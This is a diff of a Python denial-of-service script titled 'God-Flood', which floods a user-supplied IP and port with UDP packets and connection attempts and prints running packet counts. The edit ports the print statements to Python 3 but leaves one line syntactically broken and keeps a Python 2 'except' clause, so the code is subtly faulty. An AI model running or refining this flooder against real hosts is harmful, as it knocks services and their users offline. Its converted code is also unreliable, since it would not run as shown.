@@ -3,7 +3,7 @@
 import socket, random, time, os, sys
 
 if len(sys.argv) < 5:
-        print "God-Flood By LiGhT"
+        print ("God-Flood By LiGhT")
         sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size> <time>")
 
 ip = sys.argv[1]
@@ -30,11 +30,11 @@ while True:
                 syn.connect((ip, port))
                 udp.sendto(bytes,(ip, port))
                 sent = sent + 1
-                print "DuMPiNG TaRGeT: %s | PoRT: %s | SiZe: %s | TiMe: %s | PaCKeT: %s"%(ip, port, size, t1m3, sent)
+                print ("DuMPiNG TaRGeT: %s | PoRT: %s | SiZe: %s | TiMe: %s | PaCKeT: %s")(%ip, port, size, t1m3, sent)
 				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
         except KeyboardInterrupt:
-                print " Stopping Flood!"
+                print (" Stopping Flood!")
                 sys.exit()
         except socket.error, msg:
-                print "Socket Couldn't Connect"
+                print ("Socket Couldn't Connect")
                 sys.exit()
